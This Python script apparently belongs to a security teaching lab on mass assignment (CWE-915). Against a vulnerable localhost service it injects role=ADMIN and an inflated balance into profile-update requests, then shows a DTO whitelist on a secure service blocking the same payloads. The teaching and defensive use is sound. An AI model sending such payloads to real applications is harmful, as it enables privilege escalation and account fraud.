#!/usr/bin/env python3
"""
A08:2021 - Mass Assignment Attack
CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

攻擊原理：
1. 漏洞版本使用 BeanUtils.copyProperties 或反射複製所有欄位
2. 攻擊者可以傳入不應該被修改的欄位（如 role, balance）
3. 安全版本使用明確的 DTO 白名單，只允許特定欄位被更新
"""

import requests
import json
import sys

# 目標 URL
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def print_response(response):
    """格式化輸出回應"""
    print(f"Status: {response.status_code}")
    try:
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
    except:
        print(response.text[:500])


def demo_mass_assignment_vulnerable():
    """
    對漏洞版本進行 Mass Assignment 攻擊
    """
    print("\n" + "="*60)
    print("漏洞版本 - Mass Assignment 攻擊 (CWE-915)")
    print("="*60)
    
    user_id = 2  # 目標使用者 ID
    
    # 先查看使用者目前的資料
    print(f"\n[1] 查看使用者 {user_id} 目前的角色和餘額...")
    
    # 正常的個人資料更新
    print("\n[2] 正常的個人資料更新（只修改 email）...")
    normal_update = {
        "email": "new-email@example.com"
    }
    
    response = requests.put(
        f"{VULNERABLE_URL}/api/integrity/profile/{user_id}",
        json=normal_update,
        timeout=10
    )
    print_response(response)
    
    # Mass Assignment 攻擊：提權為 ADMIN
    print("\n[3] Mass Assignment 攻擊：注入 role=ADMIN...")
    malicious_update = {
        "email": "hacker@evil.com",
        "role": "ADMIN"  # 惡意注入：提權為管理員
    }
    
    response = requests.put(
        f"{VULNERABLE_URL}/api/integrity/profile/{user_id}",
        json=malicious_update,
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 200:
        data = response.json()
        if data.get("user", {}).get("role") == "ADMIN":
            print("\n[+] ✓ 提權成功！使用者現在是 ADMIN！")
    
    # Mass Assignment 攻擊：修改餘額
    print("\n[4] Mass Assignment 攻擊：注入 balance=999999...")
    balance_attack = {
        "email": "hacker@evil.com",
        "balance": 999999.99  # 惡意注入：增加餘額
    }
    
    response = requests.put(
        f"{VULNERABLE_URL}/api/integrity/profile/{user_id}",
        json=balance_attack,
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 200:
        data = response.json()
        balance = data.get("user", {}).get("balance")
        if balance and float(str(balance)) > 1000:
            print(f"\n[+] ✓ 餘額修改成功！現在餘額: ${balance}")
    
    # 使用 BeanUtils 端點
    print("\n[5] 使用 BeanUtils.copyProperties 端點...")
    bean_attack = {
        "id": user_id,
        "username": "normal-user",
        "email": "user@example.com",
        "role": "ADMIN",       # 惡意注入
        "balance": 50000.00,   # 惡意注入
        "enabled": True
    }
    
    response = requests.post(
        f"{VULNERABLE_URL}/api/integrity/profile/update",
        json=bean_attack,
        timeout=10
    )
    print_response(response)


def demo_mass_assignment_secure():
    """
    對安全版本進行 Mass Assignment 攻擊（應該失敗）
    """
    print("\n" + "="*60)
    print("安全版本 - DTO 白名單防護")
    print("="*60)
    
    user_id = 2
    
    # 嘗試 Mass Assignment 攻擊
    print("\n[1] 嘗試 Mass Assignment 攻擊...")
    malicious_update = {
        "email": "hacker@evil.com",
        "fullName": "Hacker",
        "phone": "1234567890",
        "role": "ADMIN",        # 嘗試提權
        "balance": 999999.99    # 嘗試修改餘額
    }
    
    response = requests.put(
        f"{SECURE_URL}/api/integrity/profile/{user_id}",
        json=malicious_update,
        timeout=10
    )
    print_response(response)
    
    # 驗證攻擊是否被阻止
    print("\n[2] 分析結果...")
    if response.status_code == 200:
        data = response.json()
        user = data.get("user", {})
        
        # 安全版本的回應中不應該包含 role 和 balance
        if "role" not in user and "balance" not in user:
            print("[+] ✓ 安全版本使用 DTO 白名單")
            print("[*] role 和 balance 欄位不在 DTO 中，無法被修改")
            print("\n[*] 允許修改的欄位:")
            print("    - email")
            print("    - fullName")
            print("    - phone")
            print("\n[*] 被保護的欄位（不可修改）:")
            print("    - role")
            print("    - balance")
            print("    - enabled")
            print("    - password")
        else:
            print("[-] 警告：安全版本可能存在問題")
    
    # 正常更新應該成功
    print("\n[3] 正常的個人資料更新...")
    normal_update = {
        "email": "legitimate-user@example.com",
        "fullName": "Legitimate User",
        "phone": "0912345678"
    }
    
    response = requests.put(
        f"{SECURE_URL}/api/integrity/profile/{user_id}",
        json=normal_update,
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 200:
        print("\n[+] ✓ 正常更新成功")


def main():
    """主函數"""
    print("""
╔═══════════════════════════════════════════════════════════════╗
║  A08:2021 - Mass Assignment Attack                           ║
║  CWE-915: Improperly Controlled Object Attribute Modification║
╠═══════════════════════════════════════════════════════════════╣
║  攻擊方式：傳入不應該被修改的欄位（如 role、balance）        ║
║  防禦方式：使用明確的 DTO 白名單，只允許特定欄位被更新       ║
╚═══════════════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
        if target == "vulnerable":
            demo_mass_assignment_vulnerable()
        elif target == "secure":
            demo_mass_assignment_secure()
        elif target == "both":
            demo_mass_assignment_vulnerable()
            demo_mass_assignment_secure()
        else:
            print(f"用法: {sys.argv[0]} [vulnerable|secure|both]")
    else:
        demo_mass_assignment_vulnerable()
        print("\n" + "-"*60 + "\n")
        demo_mass_assignment_secure()
    
    print("\n[*] 演示完成")


if __name__ == "__main__":
    main()
